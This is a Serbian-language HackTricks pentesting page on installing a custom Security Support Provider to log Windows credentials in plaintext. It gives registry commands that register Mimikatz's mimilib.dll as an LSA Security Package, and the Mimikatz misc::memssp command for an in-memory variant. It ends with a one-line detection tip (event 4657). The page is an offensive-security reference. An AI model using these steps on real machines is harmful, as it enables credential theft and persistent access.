# Prilagođeni SSP

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### Prilagođeni SSP

[Saznajte šta je SSP (Security Support Provider) ovde.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Možete kreirati **svoj SSP** da biste **uhvatili** u **čistom tekstu** **kredencijale** korišćene za pristup mašini.

#### Mimilib

Možete koristiti binarni fajl `mimilib.dll` koji pruža Mimikatz. **Ovo će zabeležiti sve kredencijale u čistom tekstu unutar fajla.**\
Ubacite dll fajl u `C:\Windows\System32\`\
Dobijte listu postojećih LSA Security paketa:

{% code title="napadac@cilj" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Dodajte `mimilib.dll` na listu pružalaca sigurnosti (Security Packages):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
I nakon ponovnog pokretanja, svi pristupni podaci mogu se pronaći u čistom tekstu u `C:\Windows\System32\kiwissp.log`

#### U memoriji

Takođe možete ubaciti ovo direktno u memoriju koristeći Mimikatz (imajte na umu da to može biti malo nestabilno/neispravno):
```powershell
privilege::debug
misc::memssp
```
Ovo neće preživeti ponovno pokretanje.

#### Mitigacija

Događaj ID 4657 - Revizija kreiranja/izmene `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
